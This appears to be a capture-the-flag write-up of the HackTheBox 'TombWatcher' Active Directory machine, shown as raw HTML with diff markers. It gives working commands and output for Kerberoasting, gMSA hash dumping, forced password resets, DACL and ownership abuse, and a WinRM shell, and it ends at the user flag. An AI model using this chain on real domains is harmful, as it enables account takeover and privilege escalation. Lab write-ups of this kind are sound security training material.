href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@6.7.2/css/all.min.css></noscript><link rel=preload href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css as=style onload='this.onload=null,this.rel="stylesheet"'><noscript><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/animate.css@4.1.1/animate.min.css></noscript><script type=application/ld+json>{"@context":"http://schema.org","@type":"BlogPosting","headline":"HTB Machine Writeup \"TombWatcher\"","inLanguage":"en","mainEntityOfPage":{"@type":"WebPage","@id":"https:\/\/fodhil-ben.github.io\/f0dh1l\/posts\/htb_tombwatcher\/"},"genre":"posts","keywords":"HTB, Windows, Active Directory","wordcount":2335,"url":"https:\/\/fodhil-ben.github.io\/f0dh1l\/posts\/htb_tombwatcher\/","datePublished":"2025-10-23T14:01:34+01:00","dateModified":"2025-10-23T14:01:34+01:00","license":"2025 F0DH1L","publisher":{"@type":"Organization","name":""},"author":{"@type":"Person","name":"F0DH1L"},"description":""}</script></head><body data-header-desktop=fixed data-header-mobile=auto><script>const query=window.matchMedia("(prefers-color-scheme: dark)");function applyTheme(){let e=window.localStorage?.getItem("theme")||"dark",t=e==="dark"||e==="auto"&&query.matches;document.body.setAttribute("theme",t?"dark":"light"),document.body.setAttribute("cfg-theme",e)}applyTheme(),query.addEventListener("change",applyTheme)</script><div id=mask></div><div class=wrapper><header class=desktop id=header-desktop><div class=header-wrapper><div class=header-title><a href=/f0dh1l/ title="My Personal Blog">F0DH1L Blog</a></div><div class=menu><div class=menu-inner><a class=menu-item href=/f0dh1l/posts/>Posts </a><a class=menu-item href=/f0dh1l/tags/>Tags </a><a class=menu-item href=/f0dh1l/about/>About </a><span class="menu-item delimiter"></span><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></div></header><header class=mobile id=header-mobile><div class=header-container><div class=header-wrapper><div class=header-title><a href=/f0dh1l/ title="My Personal Blog">F0DH1L Blog</a></div><div class=menu-toggle id=menu-toggle-mobile><span></span><span></span><span></span></div></div><div class=menu id=menu-mobile><a class=menu-item href=/f0dh1l/posts/ title>Posts</a><a class=menu-item href=/f0dh1l/tags/ title>Tags</a><a class=menu-item href=/f0dh1l/about/ title>About</a><a href=javascript:void(0); class="menu-item theme-switch" title="Switch Theme">
+<i class="fas fa-adjust fa-fw" aria-hidden=true></i></a></div></div></header><main class=main><div class=container><div class=toc id=toc-auto><h2 class=toc-title>Contents</h2><div class=toc-content id=toc-content-auto></div></div><article class="page single"><h1 class="single-title animate__animated animate__flipInX">HTB Machine Writeup "TombWatcher"</h1><div class=post-meta><div class=post-meta-line><span class=post-author><a href=/f0dh1l/ title=Author rel=author class=author><i class="fas fa-user-circle fa-fw" aria-hidden=true></i>F0DH1L</a></span></div><div class=post-meta-line><i class="far fa-calendar-alt fa-fw" aria-hidden=true></i>&nbsp;<time datetime=2025-10-23>2025-10-23</time>&nbsp;<i class="fas fa-pencil-alt fa-fw" aria-hidden=true></i>&nbsp;2335 words&nbsp;
+<i class="far fa-clock fa-fw" aria-hidden=true></i>&nbsp;11 minutes&nbsp;</div></div><div class="details toc" id=toc-static data-kept><div class="details-summary toc-title"><span>Contents</span>
+<span><i class="details-icon fas fa-angle-right" aria-hidden=true></i></span></div><div class="details-content toc-content" id=toc-content-static><nav id=TableOfContents><ul><li><a href=#machine-information>Machine Information</a></li><li><a href=#overview>Overview</a></li><li><a href=#reconnaissance>Reconnaissance</a></li><li><a href=#initial-reconnaissance-bloodhound-analysis>Initial Reconnaissance: BloodHound Analysis</a></li><li><a href=#exploitation-the-attack-chain>Exploitation: The Attack Chain</a><ul><li><a href=#first-step---kerberoasting>First Step - Kerberoasting</a></li><li><a href=#step-2-adding-alfred-to-infrastructure-group>Step 2: Adding Alfred to Infrastructure Group</a></li><li><a href=#step-2-reading-gmsa-password-for-ansible_dev>Step 2: Reading GMSA Password for ansible_dev$</a></li><li><a href=#step-3-force-password-change-on-sam>Step 3: Force Password Change on sam</a></li><li><a href=#step-4-taking-ownership-of-john>Step 4: Taking Ownership of john</a></li><li><a href=#step-5-granting-full-control-and-password-reset>Step 5: Granting Full Control and Password Reset</a></li><li><a href=#step-6-initial-shell-as-john>Step 6: Initial Shell as john</a></li></ul></li><li><a href=#privilege-escalation-path-to-domain-admin>Privilege Escalation: Path to Domain Admin</a><ul><li><a href=#investigating-the-adcs>Investigating the ADCS</a></li><li><a href=#discovering-deleted-users>Discovering Deleted Users</a></li><li><a href=#restoring-cert_admin>Restoring cert_admin</a></li></ul></li><li><a href=#adcs-exploitation-esc15-attack>ADCS Exploitation: ESC15 Attack</a><ul><li><a href=#enumerating-certificate-templates>Enumerating Certificate Templates</a></li><li><a href=#understanding-esc15>Understanding ESC15</a></li><li><a href=#initial-attempt-failed>Initial Attempt (Failed)</a></li><li><a href=#esc15-exploitation-two-step-method>ESC15 Exploitation (Two-Step Method)</a></li></ul></li><li><a href=#conclusion>Conclusion</a></li></ul></nav></div></div><div class=content id=content><h1 id=htb-machine-tombwatcher---writeup>HTB Machine: TombWatcher - Writeup</h1><h2 id=machine-information>Machine Information</h2><ul><li><strong>Difficulty</strong>: Medium</li><li><strong>Key Concepts</strong>: Kerberoasting, LDAP Enumeration, BloodHound Analysis, Active Directory Privilege Escalation, Deleted Object Recovery, ADCS ESC15 Vulnerability</li></ul><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_tombwatcher/image-3.png data-srcset="/f0dh1l/images/htb_tombwatcher/image-3.png, /f0dh1l/images/htb_tombwatcher/image-3.png 1.5x, /f0dh1l/images/htb_tombwatcher/image-3.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_tombwatcher/image-3.png title="Solve Screenshot"></p><h2 id=overview>Overview</h2><p><strong>TombWatcher</strong> is a Medium Windows machine from HackTheBox that demonstrates a complex Active Directory attack path involving Kerberoasting, group membership manipulation, GMSA password extraction, ownership changes, recovering and restoring deleted AD objects, and ultimately exploiting an ADCS vulnerability (ESC15) to achieve domain administrator privileges.</p><h2 id=reconnaissance>Reconnaissance</h2><p>First, I started with an nmap scan to identify open services on the target machine at <code>10.10.11.72</code>. The scan revealed typical Active Directory services including LDAP, Kerberos, and SMB.</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Nmap 7.94SVN scan initiated Wed Oct  1 11:26:27 2025 as: nmap -sC -sV -oN nmap_init 10.10.11.72</span>
+</span></span><span class=line><span class=cl>Nmap scan report <span class=k>for</span> 10.10.11.72
+</span></span><span class=line><span class=cl>Host is up <span class=o>(</span>0.051s latency<span class=o>)</span>.
+</span></span><span class=line><span class=cl>Not shown: <span class=m>988</span> filtered tcp ports <span class=o>(</span>no-response<span class=o>)</span>
+</span></span><span class=line><span class=cl>PORT     STATE SERVICE       VERSION
+</span></span><span class=line><span class=cl>53/tcp   open  domain        Simple DNS Plus
+</span></span><span class=line><span class=cl>80/tcp   open  http          Microsoft IIS httpd 10.0
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-title: IIS Windows Server
+</span></span><span class=line><span class=cl><span class=p>|</span> http-methods: 
+</span></span><span class=line><span class=cl><span class=p>|</span>_  Potentially risky methods: TRACE
+</span></span><span class=line><span class=cl><span class=p>|</span>_http-server-header: Microsoft-IIS/10.0
+</span></span><span class=line><span class=cl>88/tcp   open  kerberos-sec  Microsoft Windows Kerberos <span class=o>(</span>server time: 2025-10-01 14:26:38Z<span class=o>)</span>
+</span></span><span class=line><span class=cl>135/tcp  open  msrpc         Microsoft Windows RPC
+</span></span><span class=line><span class=cl>139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+</span></span><span class=line><span class=cl>389/tcp  open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>DC01.tombwatcher.htb
+</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2025-11-16T00:47:59
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2025-10-01T14:28:46+00:00<span class=p>;</span> +4h00m00s from scanner time.
+</span></span><span class=line><span class=cl>445/tcp  open  microsoft-ds?
+</span></span><span class=line><span class=cl>464/tcp  open  kpasswd5?
+</span></span><span class=line><span class=cl>593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+</span></span><span class=line><span class=cl>636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>DC01.tombwatcher.htb
+</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2025-11-16T00:47:59
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2025-10-01T14:28:46+00:00<span class=p>;</span> +4h00m01s from scanner time.
+</span></span><span class=line><span class=cl>3268/tcp open  ldap          Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2025-10-01T14:28:47+00:00<span class=p>;</span> +4h00m00s from scanner time.
+</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>DC01.tombwatcher.htb
+</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2025-11-16T00:47:59
+</span></span><span class=line><span class=cl>3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP <span class=o>(</span>Domain: tombwatcher.htb0., Site: Default-First-Site-Name<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_ssl-date: 2025-10-01T14:28:46+00:00<span class=p>;</span> +4h00m01s from scanner time.
+</span></span><span class=line><span class=cl><span class=p>|</span> ssl-cert: Subject: <span class=nv>commonName</span><span class=o>=</span>DC01.tombwatcher.htb
+</span></span><span class=line><span class=cl><span class=p>|</span> Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::&lt;unsupported&gt;, DNS:DC01.tombwatcher.htb
+</span></span><span class=line><span class=cl><span class=p>|</span> Not valid before: 2024-11-16T00:47:59
+</span></span><span class=line><span class=cl><span class=p>|</span>_Not valid after:  2025-11-16T00:47:59
+</span></span><span class=line><span class=cl>Service Info: Host: DC01<span class=p>;</span> OS: Windows<span class=p>;</span> CPE: cpe:/o:microsoft:windows
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Host script results:
+</span></span><span class=line><span class=cl><span class=p>|</span>_smb2-time: Protocol negotiation failed <span class=o>(</span>SMB2<span class=o>)</span>
+</span></span><span class=line><span class=cl><span class=p>|</span>_clock-skew: mean: 4h00m00s, deviation: 0s, median: 3h59m59s
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class=line><span class=cl><span class=c1># Nmap done at Wed Oct  1 11:28:47 2025 -- 1 IP address (1 host up) scanned in 140.50 seconds</span></span></span></code></pre></div></div><h2 id=initial-reconnaissance-bloodhound-analysis>Initial Reconnaissance: BloodHound Analysis</h2><p>Since I have a user inside the AD, I can get the BloodHound ingestion file and visualize the attack path. I collected Active Directory data using BloodHound via NetExec (you can use bloodhound-python as well):</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc ldap 10.10.11.72 -u Alfred -p <span class=s1>&#39;basketball&#39;</span> --bloodhound --collection All --dns-server 10.10.11.72</span></span></code></pre></div></div><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>LDAP        10.10.11.72     <span class=m>389</span>    DC01             <span class=o>[</span>*<span class=o>]</span> Windows <span class=m>10</span> / Server <span class=m>2019</span> Build <span class=m>17763</span> <span class=o>(</span>name:DC01<span class=o>)</span> <span class=o>(</span>domain:tombwatcher.htb<span class=o>)</span> <span class=o>(</span>signing:None<span class=o>)</span> <span class=o>(</span>channel binding:Never<span class=o>)</span>
+</span></span><span class=line><span class=cl>LDAP        10.10.11.72     <span class=m>389</span>    DC01             <span class=o>[</span>+<span class=o>]</span> tombwatcher.htb<span class=se>\A</span>lfred:basketball 
+</span></span><span class=line><span class=cl>LDAP        10.10.11.72     <span class=m>389</span>    DC01             Resolved collection methods: session, group, objectprops, acl, container, psremote, trusts, rdp, dcom, localadmin
+</span></span><span class=line><span class=cl>LDAP        10.10.11.72     <span class=m>389</span>    DC01             Done in 0M 18S
+</span></span><span class=line><span class=cl>LDAP        10.10.11.72     <span class=m>389</span>    DC01             Compressing output into /home/fodhil/.nxc/logs/DC01_10.10.11.72_2025-10-01_162221_bloodhound.zip</span></span></code></pre></div></div><p>The collection completed successfully and revealed a clear privilege escalation path from <code>alfred</code> to a user that is a member of <code>Remote Management Users</code>, so after getting that user we can connect to the host with WinRM:</p><p><img class=lazyload src=/f0dh1l/svg/loading.min.svg data-src=/f0dh1l/images/htb_tombwatcher/image-1.png data-srcset="/f0dh1l/images/htb_tombwatcher/image-1.png, /f0dh1l/images/htb_tombwatcher/image-1.png 1.5x, /f0dh1l/images/htb_tombwatcher/image-1.png 2x" data-sizes=auto alt=/f0dh1l/images/htb_tombwatcher/image-1.png title="alt text"></p><h2 id=exploitation-the-attack-chain>Exploitation: The Attack Chain</h2><h3 id=first-step---kerberoasting>First Step - Kerberoasting</h3><p>The first step we need to exploit is that the user Henry has &ldquo;WriteSPN&rdquo; to the user Alfred.
+With this ability we can attempt to add a SPN and then do a kerberos auth to obtain a crackable hash, it’s called: Targeted Kerberoasting.</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 targetedKerberoast/targetedKerberoast.py -u henry -p <span class=s1>&#39;H3nry_987TGV!&#39;</span> --dc-ip 10.10.11.72 -d tombwatcher.htb</span></span></code></pre></div></div><p>Before running this, I synchronized my local time with the domain controller to avoid Kerberos authentication issues:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sudo ntpdate -u 10.10.11.72</span></span></code></pre></div></div><p>The Kerberoasting attack successfully retrieved a hash for user <code>alfred</code>, which I cracked to obtain the password: <strong><code>basketball</code></strong></p><hr><h3 id=step-2-adding-alfred-to-infrastructure-group>Step 2: Adding Alfred to Infrastructure Group</h3><p>BloodHound revealed that <code>alfred</code> has <strong>AddSelf</strong> privileges on the <strong>Infrastructure</strong> group. I used <code>bloodyAD</code> to add alfred to this group:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>bloodyAD --host <span class=s1>&#39;10.10.11.72&#39;</span> -d <span class=s1>&#39;tombwatcher.htb&#39;</span> -u <span class=s1>&#39;alfred&#39;</span> -p <span class=s1>&#39;basketball&#39;</span> add groupMember INFRASTRUCTURE alfred    </span></span></code></pre></div></div><p>✅ <strong>Success!</strong> Alfred is now a member of the Infrastructure group.</p><h3 id=step-2-reading-gmsa-password-for-ansible_dev>Step 2: Reading GMSA Password for ansible_dev$</h3><p>The Infrastructure group has <strong>ReadGMSAPassword</strong> privileges on the <code>ansible_dev$</code> computer account. Group Managed Service Accounts (GMSA) store their passwords in a readable attribute for authorized users. I extracted the password using gMSADumper:</p><p><strong>References:</strong></p><ul><li><a href=https://learn.microsoft.com/en-us/windows-server/security/group-managed-service-accounts/group-managed-service-accounts-overview target=_blank rel="noopener noreffer">Group Managed Service Accounts Overview</a></li><li><a href=https://github.com/micahvandeusen/gMSADumper target=_blank rel="noopener noreffer">gMSADumper Tool</a></li></ul><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>python3 gMSADumper.py -u <span class=s1>&#39;alfred&#39;</span> -p <span class=s1>&#39;basketball&#39;</span> -d <span class=s1>&#39;tombwatcher.htb&#39;</span></span></span></code></pre></div></div><p><strong>Result:</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>Users or groups who can <span class=nb>read</span> password <span class=k>for</span> ansible_dev$:
+</span></span><span class=line><span class=cl> &gt; Infrastructure
+</span></span><span class=line><span class=cl>ansible_dev$:::4f46405647993c7d4e1dc1c25dd6ecf4
+</span></span><span class=line><span class=cl>ansible_dev$:aes256-cts-hmac-sha1-96:2712809c101bf9062a0fa145fa4db3002a632c2533e5a172e9ffee4343f89deb
+</span></span><span class=line><span class=cl>ansible_dev$:aes128-cts-hmac-sha1-96:d7bda16ace0502b6199459137ff3c52d</span></span></code></pre></div></div><h3 id=step-3-force-password-change-on-sam>Step 3: Force Password Change on sam</h3><p>The <code>ansible_dev$</code> computer account has <strong>ForceChangePassword</strong> privileges on user <code>sam</code>. I used NetExec to change sam&rsquo;s password:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>nxc smb 10.10.11.72 -u <span class=s1>&#39;ansible_dev$&#39;</span> -H 4f46405647993c7d4e1dc1c25dd6ecf4 -M change-password -o <span class=nv>USER</span><span class=o>=</span>sam <span class=nv>NEWPASS</span><span class=o>=</span>NewPassword</span></span></code></pre></div></div><p>✅ <strong>Success!</strong> Sam&rsquo;s password was changed to <code>NewPassword</code>.</p><h3 id=step-4-taking-ownership-of-john>Step 4: Taking Ownership of john</h3><p>User <code>sam</code> has <strong>WriteOwner</strong> privileges on user <code>john</code>, allowing sam to change john&rsquo;s owner to himself. However, I encountered an MD4 hash algorithm error. To fix this, I updated <code>/etc/ssl/openssl.cnf</code>:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-conf"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code class=language-conf data-lang=conf>[openssl_init]
 providers = provider_sect
 
 [provider_sect]
@@ -308,219 +91,120 @@ legacy = legacy_sect
 activate = 1
 
 [legacy_sect]
-activate = 1</code></pre></div>
-<p>Now I could change john&rsquo;s owner:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">owneredit.py -action write -new-owner <span class="s1">&#39;sam&#39;</span> -target <span class="s1">&#39;john&#39;</span> <span class="s1">&#39;tombwatcher.htb/sam:NewPassword&#39;</span></span></span></code></pre></div></div>
-<p><strong>Result:</strong></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>[*] Current owner information below
+activate = 1</code></pre></div><p>Now I could change john&rsquo;s owner:</p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-bash"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><div class=highlight><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>owneredit.py -action write -new-owner <span class=s1>&#39;sam&#39;</span> -target <span class=s1>&#39;john&#39;</span> <span class=s1>&#39;tombwatcher.htb/sam:NewPassword&#39;</span></span></span></code></pre></div></div><p><strong>Result:</strong></p><div class="code-block code-line-numbers open" style="counter-reset:code-block 0"><div class="code-header language-"><span class=code-title><i class="arrow fas fa-angle-right fa-fw" aria-hidden=true></i></span>
+<span class=ellipses><i class="fas fa-ellipsis-h fa-fw" aria-hidden=true></i></span>
+<span class=copy title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden=true></i></span></div><pre tabindex=0><code>[*] Current owner information below
 [*] - SID: S-1-5-21-1392491010-1358638721-2126982587-512
 [*] - sAMAccountName: Domain Admins
 [*] - distinguishedName: CN=Domain Admins,CN=Users,DC=tombwatcher,DC=htb
-[*] OwnerSid modified successfully!</code></pre></div>
-<h3 id="step-5-granting-full-control-and-password-reset">Step 5: Granting Full Control and Password Reset</h3>
-<p>With ownership of john, I granted sam <strong>FullControl</strong> over john&rsquo;s account:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">dacledit.py -action <span class="s1">&#39;write&#39;</span> -rights <span class="s1">&#39;FullControl&#39;</span> -principal <span class="s1">&#39;sam&#39;</span> -target <span class="s1">&#39;john&#39;</span> <span class="s1">&#39;tombwatcher.htb/sam:NewPassword&#39;</span></span></span></code></pre></div></div>
-<p><strong>Result:</strong></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><pre tabindex="0"><code>[*] DACL backed up to dacledit-20251001-174816.bak
-[*] DACL modified successfully!</code></pre></div>
-<p>Now I could reset john&rsquo;s password:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">nxc smb 10.10.11.72 -u <span class="s1">&#39;sam&#39;</span> -p NewPassword -M change-password -o <span class="nv">USER</span><span class="o">=</span>john <span class="nv">NEWPASS</span><span class="o">=</span>NewPassword</span></span></code></pre></div></div>
-<p><strong>Result:</strong></p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>*<span class="o">]</span> Windows <span class="m">10</span> / Server <span class="m">2019</span> Build <span class="m">17763</span> x64 <span class="o">(</span>name:DC01<span class="o">)</span> <span class="o">(</span>domain:tombwatcher.htb<span class="o">)</span> <span class="o">(</span>signing:True<span class="o">)</span> <span class="o">(</span>SMBv1:False<span class="o">)</span> <span class="o">(</span>Null Auth:True<span class="o">)</span>
-</span></span><span class="line"><span class="cl">SMB         10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> tombwatcher.htb<span class="se">\s</span>am:NewPassword 
-</span></span><span class="line"><span class="cl">CHANGE-P... 10.10.11.72     <span class="m">445</span>    DC01             <span class="o">[</span>+<span class="o">]</span> Successfully changed password <span class="k">for</span> john</span></span></code></pre></div></div>
-<h3 id="step-6-initial-shell-as-john">Step 6: Initial Shell as john</h3>
-<p>With john&rsquo;s credentials compromised, I connected via Evil-WinRM:</p>
-<div class="code-block code-line-numbers open" style="counter-reset: code-block 0">
-    <div class="code-header language-bash">
-        <span class="code-title"><i class="arrow fas fa-angle-right fa-fw" aria-hidden="true"></i></span>
-        <span class="ellipses"><i class="fas fa-ellipsis-h fa-fw" aria-hidden="true"></i></span>
-        <span class="copy" title="Copy to clipboard"><i class="far fa-copy fa-fw" aria-hidden="true"></i></span>
-    </div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">evil-winrm -i 10.10.11.72 -u john -p NewPassword</span></span></code></pre></div></div>
-<p>✅ <strong>User flag obtained!</strong></p>
-<p>At this point, I noticed john has <strong>GenericAll</strong> privileges on the ADCS OU, which would be crucial for the next phase.</p>
-<hr>
